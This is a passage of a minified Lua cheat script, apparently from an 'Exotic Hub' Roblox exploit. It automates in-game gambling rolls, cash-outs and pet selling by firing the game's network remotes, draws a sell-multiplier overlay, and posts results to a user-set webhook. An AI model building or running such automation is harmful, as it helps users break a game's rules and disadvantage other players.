			string.format("<b>\240\159\147\136 Fruit Stock</b>  <font color=\'#AAAAAA\'>Reset %s</font>", Z.SellManager.FormatDailyDealTime(y))
		}
		local i = Z.SellMultiplierOverrides.GetLiveBoardNamesSellMultiplierOverrides()
		if # i == 0 then
			table.insert(j, "<font color=\'#FFCC66\'>Waiting for stock data...</font>")
		end
		for G, V in ipairs(i) do
			local y = Z.SellMultiplierOverrides.GetMultiplierForFruitSellMultiplierOverrides(V)
			if y then
				local G = y >= 2 and "#7CFC00" or y < 1 and "#FFCC66" or "#FFFFFF"
				table.insert(j, string.format("<font color=\'#FFFFFF\'>%s</font>  <font color=\'%s\'>%s</font>", V, G, Z.SellMultiplierOverrides.FormatMultiplierSellMultiplierOverrides(y)))
			else
				table.insert(j, string.format("<font color=\'#FFFFFF\'>%s</font>  <font color=\'#AAAAAA\'>waiting</font>", V))
			end
		end
		return table.concat(j, "\n")
	end;
	EnsureLiveBoardSellMultiplierOverrides = function()
		if Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides and Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides.Parent then
			return true
		end
		local G = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
		if not G then
			return false
		end
		local V = Instance.new("ScreenGui")
		V.Name = "ExoFruitStockBoard"
		V.ResetOnSpawn = false
		V.IgnoreGuiInset = true
		V.DisplayOrder = 999998
		V.Parent = G
		local j = Instance.new("Frame")
		j.Name = "Board"
		j.AnchorPoint = Vector2.new(1, .5)
		j.Position = UDim2.new(1, - 10, .5, 0)
		j.Size = UDim2.new(.4, - 20, .8, 0)
		j.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
		j.BackgroundTransparency = .25
		j.BorderSizePixel = 0
		j.Parent = V
		local i = Instance.new("UICorner")
		i.CornerRadius = UDim.new(0, 8)
		i.Parent = j
		local c = Instance.new("ScrollingFrame")
		c.Name = "List"
		c.BackgroundTransparency = 1
		c.BorderSizePixel = 0
		c.Position = UDim2.fromOffset(10, 10)
		c.Size = UDim2.new(1, - 20, 1, - 20)
		c.CanvasSize = UDim2.fromOffset(0, 0)
		c.ScrollBarThickness = 4
		c.Parent = j
		local J = Instance.new("TextLabel")
		J.Name = "Text"
		J.BackgroundTransparency = 1
		J.Position = UDim2.fromOffset(0, 0)
		J.Size = UDim2.new(1, - 8, 0, 0)
		J.AutomaticSize = Enum.AutomaticSize.Y
		J.Font = Enum.Font.Code
		J.RichText = true
		J.TextWrapped = false
		J.TextXAlignment = Enum.TextXAlignment.Left
		J.TextYAlignment = Enum.TextYAlignment.Top
		J.TextSize = 18
		J.TextColor3 = Color3.fromRGB(255, 255, 255)
		J.Parent = c
		Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides = V
		Z.SellMultiplierOverrides.LiveBoardLabelSellMultiplierOverrides = J
		Z.SellMultiplierOverrides.LiveBoardScrollSellMultiplierOverrides = c
		return true
	end;
	RefreshLiveBoardSellMultiplierOverrides = function()
		if h.sell_multiplier_show_live ~= true then
			if Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides then
				Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides.Enabled = false
			end
			return false
		end
		if not Z.SellMultiplierOverrides.EnsureLiveBoardSellMultiplierOverrides() then
			return false
		end
		local G = Z.SellMultiplierOverrides.LiveBoardGuiSellMultiplierOverrides
		local V = Z.SellMultiplierOverrides.LiveBoardLabelSellMultiplierOverrides
		local y = Z.SellMultiplierOverrides.LiveBoardScrollSellMultiplierOverrides
		if G then
			G.Enabled = true
		end
		if V then
			V.Text = Z.SellMultiplierOverrides.BuildLiveBoardTextSellMultiplierOverrides()
			if y then
				y.CanvasSize = UDim2.fromOffset(0, math.max(V.TextBounds.Y + 20, y.AbsoluteSize.Y))
			end
		end
		return true
	end,
	StartLiveBoardSellMultiplierOverrides = function()
		if Z.SellMultiplierOverrides.LiveBoardStartedSellMultiplierOverrides then
			return false
		end
		Z.SellMultiplierOverrides.LiveBoardStartedSellMultiplierOverrides = true
		task.spawn(function()
			while not g.is_forced_stop do
				local G, V = pcall(Z.SellMultiplierOverrides.RefreshLiveBoardSellMultiplierOverrides)
				if not G then
					warn("[SellMultiplierBoard]", V)
				end
				task.wait(1)
			end
		end)
		return true
	end
}
Z.SellManager.StartDailyDealStatusLoopSellManager()
g.DoubleOrNothingStatusText = ""
g.DoubleOrNothingLogs = g.DoubleOrNothingLogs or {}
g.DoubleOrNothingUi = g.DoubleOrNothingUi or {}
Z.DoubleOrNothingSeller = {
	BusyDoubleOrNothingSeller = false,
	PendingCashOutDoubleOrNothingSeller = false;
	PendingInfoDoubleOrNothingSeller = {};
	LastRunAtDoubleOrNothingSeller = 0,
	RetryAtDoubleOrNothingSeller = 0;
	SetStatusDoubleOrNothingSeller = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.DoubleOrNothingStatusText = ""
			return false
		end
		g.DoubleOrNothingStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\142\178 [Double]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	FormatMoneyDoubleOrNothingSeller = function(G)
		return q.formatShecklesNumber(tonumber(G) or 0)
	end;
	GetTargetDoubleOrNothingSeller = function()
		return math.clamp(math.floor(tonumber(h.double_or_nothing_target_streak) or 3), 1, 10)
	end,
	GetDelayDoubleOrNothingSeller = function()
		return math.clamp(tonumber(h.double_or_nothing_roll_delay) or .15, .001, 3)
	end;
	GetRemoteDoubleOrNothingSeller = function(G)
		G = tostring(G or "")
		local V = y.Networking and (y.Networking.NPCS and y.Networking.NPCS[G])
		if not V or type(V.Fire) ~= "function" then
			return nil
		end
		return V
	end,
	FireRemoteDoubleOrNothingSeller = function(G)
		local V = Z.DoubleOrNothingSeller.GetRemoteDoubleOrNothingSeller(G)
		if not V then
			return false, "Remote missing: " .. tostring(G)
		end
		local y, j = pcall(function()
			return V:Fire()
		end)
		if not y then
			return false, tostring(j or "Remote failed")
		end
		return true, j
	end;
	PreviewDoubleOrNothingSeller = function(G)
		local V = nil
		if Z.SellManager and type(Z.SellManager.PreviewSellAll) == "function" then
			local G, y = pcall(Z.SellManager.PreviewSellAll)
			if G then
				V = y
			end
		end
		V = type(V) == "table" and V or {}
		local y = math.max(math.floor(tonumber(V.FruitCount or G or Z.PlayerData.GetFruitCount()) or 0), 0)
		local j = tonumber(V.TotalSellValue or V.TotalValue or V.TotalBaseValue or V.SellPrice) or 0
		return {
			raw = V,
			fruitCount = y;
			totalValue = j
		}
	end;
	AddLogDoubleOrNothingSeller = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		table.insert(g.DoubleOrNothingLogs, 1, string.format("%s -- %s", os.date("%H:%M:%S"), G))
		while # g.DoubleOrNothingLogs > 40 do
			table.remove(g.DoubleOrNothingLogs)
		end
		if g.DoubleOrNothingUi.RefreshLogsDoubleOrNothingUi then
			g.DoubleOrNothingUi.RefreshLogsDoubleOrNothingUi()
		end
		return true
	end;
	GetLogsTextDoubleOrNothingSeller = function()
		if type(g.DoubleOrNothingLogs) ~= "table" or # g.DoubleOrNothingLogs == 0 then
			return "<font color=\'#888888\'>No Double or Nothing logs yet.</font>"
		end
		local G = {}
		for V = 1, math.min(# g.DoubleOrNothingLogs, 10), 1 do
			table.insert(G, g.DoubleOrNothingLogs[V])
		end
		return table.concat(G, "\n")
	end,
	BuildWebhookPayloadDoubleOrNothingSeller = function(G, V)
		V = type(V) == "table" and V or {}
		local j = G == "win"
		local i = j and "\240\159\142\178 Double or Nothing Won!" or "\240\159\146\165 Double or Nothing Lost!"
		local c = j and "Cash-out completed successfully." or "Inventory was busted by Double or Nothing."
		local J = j and 5763719 or 15548997
		local T = {
			{
				name = "\240\159\145\164 Account";
				value = "||@" .. (tostring(y.LocalPlayer and y.LocalPlayer.Name or "Unknown") .. "||"),
				inline = true
			},
			{
				name = "\240\159\148\165 Streak";
				value = tostring(V.streak or 0) .. (" / " .. tostring(V.target or Z.DoubleOrNothingSeller.GetTargetDoubleOrNothingSeller()));
				inline = true
			},
			{
				name = "\240\159\142\146 Fruits";
				value = tostring(V.fruits or 0),
				inline = true
			};
			{
				name = "\240\159\147\166 Inventory Value",
				value = "$" .. Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(V.inventoryValue);
				inline = true
			}
		}
		if j then
			table.insert(T, {
				name = "\240\159\146\176 Cash Out";
				value = "$" .. Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(V.sellPrice or V.pot),
				inline = true
			})
			table.insert(T, {
				name = "\226\156\133 Sold Count";
				value = tostring(V.soldCount or V.fruits or 0),
				inline = true
			})
		else
			table.insert(T, {
				name = "\240\159\146\184 Lost Value",
				value = "$" .. Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(V.lostValue or V.inventoryValue);
				inline = true
			})
			table.insert(T, {
				name = "\240\159\148\129 Can Revive";
				value = V.canRevive and "Yes" or "No";
				inline = true
			})
		end
		return {
			username = "Exotic Hub";
			embeds = {
				{
					title = i,
					description = c;
					color = J,
					fields = T;
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end;
	SendWebhookDoubleOrNothingSeller = function(G, V)
		if not h.webhook_enabled then
			return false
		end
		if G == "win" and h.double_or_nothing_webhook_win ~= true then
			return false
		end
		if G == "loss" and h.double_or_nothing_webhook_loss ~= true then
			return false
		end
		if not Z.Webhooks or type(Z.Webhooks.Post) ~= "function" or type(Z.Webhooks.IsValidUrl) ~= "function" or not Z.Webhooks.IsValidUrl(h.webhook_url) then
			return false
		end
		local y = Z.DoubleOrNothingSeller.BuildWebhookPayloadDoubleOrNothingSeller(G, V)
		task.spawn(function()
			local G, V = Z.Webhooks.Post(y)
			if not G then
				warn("[DoubleOrNothingWebhook]", V)
			end
		end)
		return true
	end,
	ResetPendingDoubleOrNothingSeller = function()
		Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller = false
		Z.DoubleOrNothingSeller.PendingInfoDoubleOrNothingSeller = {}
	end,
	CashOutDoubleOrNothingSeller = function(G)
		G = type(G) == "table" and G or Z.DoubleOrNothingSeller.PendingInfoDoubleOrNothingSeller
		Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller = true
		Z.DoubleOrNothingSeller.PendingInfoDoubleOrNothingSeller = G
		Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Claiming streak " .. (tostring(G.streak or 0) .. "..."), "#66CCFF")
		local V, y = Z.DoubleOrNothingSeller.FireRemoteDoubleOrNothingSeller("CashOutDoubleOrNothing")
		if V and (type(y) == "table" and y.Success == true) then
			local V = {
				target = G.target,
				streak = tonumber(y.Wins or G.streak) or 0;
				fruits = tonumber(G.fruits or y.SoldCount) or 0;
				soldCount = tonumber(y.SoldCount or G.fruits) or 0,
				inventoryValue = tonumber(G.inventoryValue) or 0;
				pot = tonumber(G.pot) or 0;
				sellPrice = tonumber(y.SellPrice or G.pot) or 0
			}
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(string.format("Won streak %d | +$%s", V.streak, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(V.sellPrice)), "#7CFC00")
			Z.DoubleOrNothingSeller.AddLogDoubleOrNothingSeller(string.format("WIN streak %d | +$%s | fruits %d", V.streak, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(V.sellPrice), V.soldCount))
			Z.DoubleOrNothingSeller.SendWebhookDoubleOrNothingSeller("win", V)
			Z.DoubleOrNothingSeller.ResetPendingDoubleOrNothingSeller()
			task.wait(.35)
			return false, {
				type = "double_or_nothing_win";
				data = V,
				raw = y
			}
		end
		Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Cash-out failed, retrying only. Normal sell blocked.", "#FFCC66")
		Z.DoubleOrNothingSeller.AddLogDoubleOrNothingSeller("Cash-out retry needed | normal SellAll blocked")
		Z.DoubleOrNothingSeller.RetryAtDoubleOrNothingSeller = os.clock() + 2
		return false, {
			type = "double_or_nothing_cashout_retry",
			data = G,
			raw = y
		}
	end;
	AbandonDoubleOrNothingSeller = function()
		Z.DoubleOrNothingSeller.FireRemoteDoubleOrNothingSeller("AbandonDoubleOrNothing")
		Z.DoubleOrNothingSeller.ResetPendingDoubleOrNothingSeller()
	end,
	RunDoubleOrNothingSeller = function(G, V)
		if Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller then
			return Z.DoubleOrNothingSeller.CashOutDoubleOrNothingSeller(Z.DoubleOrNothingSeller.PendingInfoDoubleOrNothingSeller)
		end
		if h.auto_double_or_nothing ~= true then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("")
			return false, "disabled"
		end
		if not g.GetCheckIfPro() then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Premium only", "#FF6666")
			return false, "not_pro"
		end
		if os.clock() < Z.DoubleOrNothingSeller.RetryAtDoubleOrNothingSeller then
			return false, "retry_wait"
		end
		if not q.IsLoadingCompleted() then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Waiting for loading", "#FFCC66")
			return false, "loading"
		end
		G = math.max(math.floor(tonumber(G or Z.PlayerData.GetFruitCount()) or 0), 0)
		if G <= 0 then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("")
			return false, "no_fruits"
		end
		V = V == true or Z.FruitCollect.IsMaxFruitInventory()
		if not V then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(string.format("Waiting full inventory %d/%d", G, Z.PlayerData.GetMaxFruitCapacity()), "#FFD966")
			return false, "waiting_full"
		end
		if ((tonumber(Z.Money.GetSheckles()) or 0)) <= 0 then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Need sheckles first", "#FFCC66")
			return false, "no_sheckles"
		end
		local y = Z.DoubleOrNothingSeller.PreviewDoubleOrNothingSeller(G)
		if y.fruitCount <= 0 then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("No fruits to double", "#FFCC66")
			return false, "preview_empty"
		end
		local j = Z.DoubleOrNothingSeller.GetTargetDoubleOrNothingSeller()
		local i = Z.DoubleOrNothingSeller.GetDelayDoubleOrNothingSeller()
		local c = 0
		local J = y.totalValue
		local T = {
			target = j;
			streak = 0,
			fruits = y.fruitCount,
			inventoryValue = y.totalValue;
			pot = J
		}
		Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(string.format("Starting %d streak | %d fruits | $%s", j, y.fruitCount, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(y.totalValue)), "#66CCFF")
		for G = 1, j, 1 do
			if h.auto_double_or_nothing ~= true then
				if c > 0 then
					Z.DoubleOrNothingSeller.AbandonDoubleOrNothingSeller()
				end
				Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Stopped", "#FFCC66")
				return false, "stopped"
			end
			local V, d = Z.DoubleOrNothingSeller.FireRemoteDoubleOrNothingSeller("DoubleOrNothing")
			if not V then
				Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(tostring(d), "#FF6666")
				Z.DoubleOrNothingSeller.RetryAtDoubleOrNothingSeller = os.clock() + 2
				return false, d
			end
			if type(d) == "table" and d.Busted == true then
				local G = {
					target = j;
					streak = tonumber(d.Wins) or c,
					fruits = y.fruitCount;
					inventoryValue = tonumber(d.InventoryValue or y.totalValue) or 0,
					lostValue = tonumber(d.LostValue or d.InventoryValue or J) or 0;
					canRevive = d.CanRevive == true
				}
				Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(string.format("Lost at streak %d | -$%s", G.streak, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(G.lostValue)), "#FF6666")
				Z.DoubleOrNothingSeller.AddLogDoubleOrNothingSeller(string.format("LOSS streak %d | -$%s | fruits %d", G.streak, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(G.lostValue), G.fruits))
				Z.DoubleOrNothingSeller.SendWebhookDoubleOrNothingSeller("loss", G)
				Z.DoubleOrNothingSeller.ResetPendingDoubleOrNothingSeller()
				task.wait(.35)
				return false, {
					type = "double_or_nothing_loss";
					data = G,
					raw = d
				}
			end
			if not ((type(d) == "table" and d.Won == true)) then
				local G = type(d) == "table" and tostring(d.Reason or "Rejected") or "Rejected"
				Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("Roll rejected: " .. G, "#FFCC66")
				Z.DoubleOrNothingSeller.RetryAtDoubleOrNothingSeller = os.clock() + 2
				return false, {
					type = "double_or_nothing_rejected";
					reason = G;
					raw = d
				}
			end
			c = tonumber(d.Wins) or (c + 1)
			J = tonumber(d.Pot) or J
			T.streak = c
			T.pot = J
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller(string.format("Won streak %d/%d | pot $%s", c, j, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(J)), "#7CFC00")
			Z.DoubleOrNothingSeller.AddLogDoubleOrNothingSeller(string.format("Roll won %d/%d | pot $%s", c, j, Z.DoubleOrNothingSeller.FormatMoneyDoubleOrNothingSeller(J)))
			if c >= j then
				return Z.DoubleOrNothingSeller.CashOutDoubleOrNothingSeller(T)
			end
			task.wait(i)
		end
		return Z.DoubleOrNothingSeller.CashOutDoubleOrNothingSeller(T)
	end,
	TryRunDoubleOrNothingSeller = function(G, V)
		if Z.DoubleOrNothingSeller.BusyDoubleOrNothingSeller then
			return false, "busy"
		end
		Z.DoubleOrNothingSeller.BusyDoubleOrNothingSeller = true
		local y, j, i = pcall(Z.DoubleOrNothingSeller.RunDoubleOrNothingSeller, G, V)
		Z.DoubleOrNothingSeller.BusyDoubleOrNothingSeller = false
		if not y then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("System error", "#FF6666")
			warn("[DoubleOrNothingSeller]", j)
			return false, j
		end
		return j, i
	end;
	LoopDoubleOrNothingSeller = function()
		if h.auto_double_or_nothing ~= true and not Z.DoubleOrNothingSeller.PendingCashOutDoubleOrNothingSeller then
			Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("")
			return false
		end
		return Z.DoubleOrNothingSeller.TryRunDoubleOrNothingSeller(Z.PlayerData.GetFruitCount(), Z.FruitCollect.IsMaxFruitInventory())
	end
}
g.PetSellerStatusText = ""
g.PetSellerUi = g.PetSellerUi or {}
Z.PetSeller = {
	Busy = false;
	NextRunAt = 0;
	RarityOrder = {
		"Common",
		"Uncommon";
		"Rare",
		"Epic",
		"Legendary";
		"Mythic";
		"Super";
		"Secret"
	},
	SetStatus = function(G, V)
		if type(G) ~= "string" or G == "" then
			g.PetSellerStatusText = ""
			return
		end
		g.PetSellerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\144\190 [Pet Seller]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
	end;
	IsSelectionEmpty = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end,
	IsSelected = function(G, V)
		if type(G) ~= "table" then
			return false
		end
		V = tostring(V or "")
		if V == "" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end,
	PassesOptionalSelection = function(G, V)
		if Z.PetSeller.IsSelectionEmpty(G) then
			return true
		end
		return Z.PetSeller.IsSelected(G, V)
	end,
	GetDelay = function()
		return math.clamp(tonumber(h.pet_sell_delay) or .25, .15, 10)
	end,
	GetKeepAmount = function()
		return math.max(math.floor(tonumber(h.pet_sell_keep_amount) or 1), 0)
	end,
	GetMaxPerCycle = function()
		return math.clamp(math.floor(tonumber(h.pet_sell_max_per_cycle) or 3), 1, 100)
	end;
	GetMaxRarityRank = function()
		local G = tostring(h.pet_sell_max_rarity or "Rare")
		return g.RarityRank[G] or g.RarityRank.Rare or 3
	end;
	GetInventory = function()
		local G = Z.DataReplica.GetData("Inventory")
		return type(G) == "table" and G or nil
	end,
	GetRawPets = function()
		local G = Z.PetSeller.GetInventory()
		local V = G and G.Pets
		return type(V) == "table" and V or nil
	end,
	GetBaseData = function(G)
		if type(y.PetData) ~= "table" or type(G) ~= "string" or G == "" then
			return nil
		end
		return y.PetData[G]
	end;
	GetDisplayName = function(G, V)
		if type(V) == "table" and (type(V.DisplayName) == "string" and V.DisplayName ~= "") then
			return V.DisplayName
		end
		return tostring(G or "Unknown")
	end;
	GetRarity = function(G, V, y)
		if type(V) == "table" and (type(V.Rarity) == "string" and V.Rarity ~= "") then
			return V.Rarity
		end
		if type(y) == "table" and (type(y.Rarity) == "string" and y.Rarity ~= "") then
			return y.Rarity
		end
		return "Unknown"
	end;
	GetBasePrice = function(G)
		return math.max(tonumber(type(G) == "table" and G.BasePrice or 0) or 0, 0)
	end;
	GetEstimate = function(G)
		return math.floor(((tonumber(G) or 0)) * .5)
	end;
	GetSize = function(G)
		local V = type(G) == "table" and G.Size
		if V == "Big" or V == "Huge" then
			return V
		end
		return "Normal"
	end,
	GetVariant = function(G)
		local V = type(G) == "table" and G.Type
		if type(V) == "string" and V ~= "" then
			return V
		end
		return "Normal"
	end,
	GetBucketKey = function(G)
		if type(G) ~= "table" then
			return ""
		end
		return table.concat({
			tostring(G.name or ""),
			tostring(G.size or "Normal"),
			tostring(G.variant or "Normal")
		}, "\031")
	end;
	BuildPetInfo = function(G, V)
		if type(V) ~= "table" then
			return nil
		end
		local y = V.Id or G
		y = type(y) == "string" and y or tostring(y or "")
		local j = V.Name or V.PetName or V.Species
		j = type(j) == "string" and j or tostring(j or "")
		if y == "" or j == "" then
			return nil
		end
		local i = Z.PetSeller.GetBaseData(j)
		local c = Z.PetSeller.GetDisplayName(j, i)
		local J = Z.PetSeller.GetRarity(j, i, V)
		local T = g.RarityRank[J] or 999
		local d = Z.PetSeller.GetBasePrice(i)
		local u = Z.PetSeller.GetSize(V)
		local q = Z.PetSeller.GetVariant(V)
		local E = {
			key = tostring(G or y);
			id = y;
			name = j,
			displayName = c;
			rarity = J,
			rarityRank = T;
			basePrice = d,
			estimate = Z.PetSeller.GetEstimate(d);
			size = u;
			variant = q,
			equipped = V.Equipped == true,
			known = type(i) == "table",
			data = V
		}
		E.bucket = Z.PetSeller.GetBucketKey(E)
		return E
	end;
	GetPets = function()
		local G = {}
		local V = Z.PetSeller.GetRawPets()
		if type(V) ~= "table" then
			return G
		end
		for V, y in pairs(V) do
			local j = Z.PetSeller.BuildPetInfo(V, y)
			if j then
				table.insert(G, j)
			end
		end
		table.sort(G, function(G, V)
			if G.rarityRank ~= V.rarityRank then
				return G.rarityRank < V.rarityRank
			end
			if G.basePrice ~= V.basePrice then
				return G.basePrice < V.basePrice
			end
			if G.displayName ~= V.displayName then
				return G.displayName < V.displayName
			end
			return G.id < V.id
		end)
		return G
	end;
	FindLivePetInfo = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local V = Z.PetSeller.GetRawPets()
		if type(V) ~= "table" then
			return nil
		end
		for V, y in pairs(V) do
			if type(y) == "table" then
				local j = tostring(y.Id or V or "")
				if j == G or tostring(V or "") == G then
					return Z.PetSeller.BuildPetInfo(V, y)
				end
			end
		end
		return nil
	end;
	IsProtectedPet = function(G)
		if type(G) ~= "table" then
			return true, "invalid"
		end
		if G.equipped then
			return true, "equipped"
		end
		if not G.known then
			return true, "unknown"
		end
		if Z.PetSeller.IsSelected(h.pet_sell_protected_ids, G.id) or Z.PetSeller.IsSelected(h.pet_sell_protected_ids, G.key) then
			return true, "protected id"
		end
		if Z.PetSeller.IsSelected(h.pet_sell_protected, G.name) or Z.PetSeller.IsSelected(h.pet_sell_protected, G.displayName) then
			return true, "protected name"
		end
		if h.pet_sell_protect_rainbow and G.variant == "Rainbow" then
			return true, "rainbow"
		end
		if h.pet_sell_protect_big_huge and ((G.size == "Big" or G.size == "Huge")) then
			return true, "big/huge"
		end
		if not Z.PetSeller.PassesOptionalSelection(h.pet_sell_size_whitelist, G.size) then
			return true, "size"
		end
		if Z.PetSeller.IsSelected(h.pet_sell_size_blacklist, G.size) then
			return true, "size protected"
		end
		if not Z.PetSeller.PassesOptionalSelection(h.pet_sell_variant_whitelist, G.variant) then
			return true, "variant"
		end
		if Z.PetSeller.IsSelected(h.pet_sell_variant_blacklist, G.variant) then
			return true, "variant protected"
		end
		if ((tonumber(G.rarityRank) or 999)) > Z.PetSeller.GetMaxRarityRank() then
			return true, "rarity"
		end
		local V = tonumber(h.pet_sell_max_base_price) or 0
		if V > 0 and ((tonumber(G.basePrice) or 0)) > V then
			return true, "price"
		end
		return false, "safe"
	end;
	BuildPetCounts = function(G)
		local V = {}
		for G, y in ipairs(G or {}) do
			local Z = tostring(y.bucket or "")
			if Z ~= "" then
				V[Z] = ((V[Z] or 0)) + 1
			end
		end
		return V
	end,
	GetSellCandidates = function()
		local G = {
			candidates = {},
			total = 0,
			selected = 0;
			protected = 0;
			skipped = 0
		}
		if Z.PetSeller.IsSelectionEmpty(h.pet_sell_selected) then
			return G
		end
		local V = Z.PetSeller.GetPets()
		G.total = # V
		local y = Z.PetSeller.BuildPetCounts(V)
		local j = {}
		for V, y in ipairs(V) do
			if not Z.PetSeller.IsSelected(h.pet_sell_selected, y.name) and not Z.PetSeller.IsSelected(h.pet_sell_selected, y.displayName) then
				G.skipped += 1
				continue
			end
			G.selected += 1
			local i = Z.PetSeller.IsProtectedPet(y)
			if i then
				G.protected += 1
				continue
			end
			j[y.bucket] = j[y.bucket] or {}
			table.insert(j[y.bucket], y)
		end
		for V, j in pairs(j) do
			table.sort(j, function(G, V)
				if G.rarityRank ~= V.rarityRank then
					return G.rarityRank < V.rarityRank
				end
				if G.basePrice ~= V.basePrice then
					return G.basePrice < V.basePrice
				end
				return G.id < V.id
			end)
			local i = # j
			if h.pet_sell_duplicate_only then
				i = math.max(((tonumber(y[V]) or 0)) - Z.PetSeller.GetKeepAmount(), 0)
			end
			i = math.min(i, # j)
			for V = 1, i, 1 do
				table.insert(G.candidates, j[V])
			end
		end
		table.sort(G.candidates, function(G, V)
			if G.rarityRank ~= V.rarityRank then
				return G.rarityRank < V.rarityRank
			end
			if G.basePrice ~= V.basePrice then
				return G.basePrice < V.basePrice
			end
			if G.displayName ~= V.displayName then
				return G.displayName < V.displayName
			end
			return G.id < V.id
		end)
		return G
	end;
	SellPet = function(G)
		G = tostring(G or "")
		if G == "" then
			return false, nil
		end
		local V = y.Networking and (y.Networking.NPCS and y.Networking.NPCS.SellPet)
		if not V or type(V.Fire) ~= "function" then
			return false, nil
		end
		return true, V:Fire(G)
	end,
	IsSellResultSuccess = function(G)
		if type(G) ~= "table" then
			return G == true
		end
		if G.Success == false then
			return false
		end
		return G.Success == true or G.SellPrice ~= nil
	end;
	GetSellPriceFromResult = function(G)
		if type(G) ~= "table" then
			return 0
		end
		return math.max(tonumber(G.SellPrice) or tonumber(G.Price) or 0, 0)
	end;
	RunPetSellerCycle = function(G)
		if not h.auto_sell_pets and not G then
			Z.PetSeller.SetStatus("")
			return false
		end
		if Z.PetSeller.Busy then
			return false
		end
		if not G and os.clock() < Z.PetSeller.NextRunAt then
			return false
		end
		Z.PetSeller.NextRunAt = os.clock() + 1
		if Z.PetSeller.IsSelectionEmpty(h.pet_sell_selected) then
			Z.PetSeller.SetStatus("Select pets first", "#FFCC66")
			Z.PetSeller.NextRunAt = os.clock() + 2
			return false
		end
		local V = Z.PetSeller.GetSellCandidates()
		local y = # V.candidates
		if y <= 0 then
			Z.PetSeller.SetStatus(string.format("No safe pets | selected %d protected %d", V.selected, V.protected), "#FFCC66")
			Z.PetSeller.NextRunAt = os.clock() + 2
			return false
		end
		if h.pet_sell_preview_only and not G then
			Z.PetSeller.SetStatus(string.format("Preview: %d safe to sell | protected %d", y, V.protected), "#66CCFF")
			Z.PetSeller.NextRunAt = os.clock() + 2
			return false
		end
		Z.PetSeller.Busy = true
		local j = 0
		local i = 0
		local c = 0
		local J = Z.PetSeller.GetMaxPerCycle()
		for V = 1, J, 1 do
			if not h.auto_sell_pets and not G then
				break
			end
			local y = Z.PetSeller.GetSellCandidates()
			local J = y.candidates[1]
			if not J then
				break
			end
			local T = Z.PetSeller.FindLivePetInfo(J.id)
			local d = T and Z.PetSeller.IsProtectedPet(T)
			if not T or d then
				i += 1
				break
			end
			Z.PetSeller.SetStatus("Selling " .. (T.displayName .. "..."), "#66CCFF")
			local u, q = Z.PetSeller.SellPet(T.id)
			if u and Z.PetSeller.IsSellResultSuccess(q) then
				j += 1
				c += Z.PetSeller.GetSellPriceFromResult(q)
			else
				i += 1
			end
			task.wait(Z.PetSeller.GetDelay())
		end
		Z.PetSeller.Busy = false
		Z.PetSeller.NextRunAt = os.clock() + math.max(Z.PetSeller.GetDelay(), 1)
		if j > 0 then
			Z.PetSeller.SetStatus(string.format("Sold %d pet%s | +$%s", j, j == 1 and "" or "s", q.formatShecklesNumber(c)), "#66FF99")
			if g.PetSellerUi.RefreshPetDropdowns then
				task.defer(g.PetSellerUi.RefreshPetDropdowns)
			end
			return true, {
				sold = j;
				failed = i;
				earned = c
			}
		end
		Z.PetSeller.SetStatus(string.format("Pet sell failed | failed %d", i), "#FF6666")
		return false, {
			sold = 0;
			failed = i;
			earned = 0
		}
	end;
	GetPetNameDropdown = function()
		local G = {}
		local V = {}
